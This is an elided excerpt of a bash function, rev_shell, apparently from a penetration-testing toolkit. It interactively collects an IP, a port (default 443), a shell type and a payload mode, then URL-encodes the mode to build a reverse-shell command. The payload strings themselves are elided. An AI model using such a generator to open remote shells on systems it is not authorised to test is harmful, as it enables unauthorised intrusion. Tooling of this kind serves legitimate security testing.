...
function rev_shell() {
    _logger prompt "[i] Enter IP (Default: $(_get_default_network_interface_ip)): \c"
    read -r IP
    local IP=${IP:-$(_get_default_network_interface_ip)}

    _logger prompt "[i] Port (Default: 443): \c"
    read -r PORT
    local PORT=${PORT:-443}
    ...
    while true; do
        _logger prompt "[i] supported shell type: $allowed_shell_types"
        _logger prompt "[i] Enter Shell (Default: /bin/bash): \c"
        read -r SHELL_TYPE
        ...
        if is_valid_shell_type "$SHELL_TYPE"; then
            ...
            _logger error "[e] Invalid SHELL_TYPE. Allowed values are: ${allowed_shell_types[*]}"
        fi
    done
    ...
    select MODE in "${bash_options[@]}"; do
      if [[ -n "$MODE" ]]; then
        _logger info "[i] Mode $MODE selected."
        local ENCODED_MODE=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$MODE'''))")
        break
      else
        _logger error "[e] Invalid selection, please try again."
      fi
    done
